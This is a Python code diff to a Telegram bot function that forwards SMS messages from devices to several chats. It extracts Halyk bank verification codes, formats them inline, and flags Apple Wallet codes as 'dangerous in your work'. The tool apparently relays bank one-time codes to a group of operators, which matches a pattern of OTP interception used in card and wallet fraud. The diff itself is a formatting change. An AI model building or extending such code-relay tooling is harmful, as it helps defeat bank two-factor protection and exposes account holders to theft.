@@ -85,14 +85,23 @@ async def _send_sms_notification_async(device_id: str, sender: str, message: str
         # Проверяем, есть ли код от Halyk
         code, is_apple = extract_halyk_code(sender, message)
         
-        # Базовое уведомление (БЕЗ форматирования кода в самом сообщении)
+        # Форматируем сообщение с кодом в <pre> если это Halyk
+        formatted_message = message
+        if code:
+            formatted_message = message.replace(code, f'<pre>{code}</pre>', 1)
+        
+        # Базовое уведомление
         notification = (
             f"📨 <b>Новое SMS</b>\n\n"
             f"<b>Устройство:</b> {device_name}\n"
             f"<b>От:</b> <code>{sender}</code>\n"
             f"<b>Время:</b> {timestamp}\n\n"
-            f"<b>Сообщение:</b>\n{message}"
+            f"<b>Сообщение:</b>\n{formatted_message}"
         )
+        
+        # Добавляем предупреждение для Apple Wallet
+        if code and is_apple:
+            notification += "\n\n⚠️ <b>ВНИМАНИЕ!</b> Это код для <b>iPhone</b> (Apple Wallet)!\n🚨 В вашей работе такие коды считаются опасными!"
         
         # Отправляем уведомления во все чаты
         for chat_id in chat_ids:
@@ -100,18 +109,6 @@ async def _send_sms_notification_async(device_id: str, sender: str, message: str
                 # Отправляем основное сообщение
                 await _bot.send_message(chat_id, notification)
                 print(f"   ✅ SMS отправлено в Telegram чат {chat_id}")
-                
-                # Если есть код от Halyk - отправляем отдельным сообщением
-                if code:
-                    # Отправляем только чистый код в формате <pre>
-                    await _bot.send_message(chat_id, f"<pre>{code}</pre>")
-                    print(f"   ✅ Код отправлен отдельным сообщением в чат {chat_id}")
-                    
-                    # Если это Apple Wallet - отправляем предупреждение третьим сообщением
-                    if is_apple:
-                        warning_message = "⚠️ <b>ВНИМАНИЕ!</b> Это код для <b>iPhone</b> (Apple Wallet)!\n🚨 В вашей работе такие коды считаются опасными!"
-                        await _bot.send_message(chat_id, warning_message)
-                        print(f"   ✅ Предупреждение отправлено в чат {chat_id}")
                     
             except Exception as e:
                 print(f"   ❌ Ошибка отправки в чат {chat_id}: {e}")
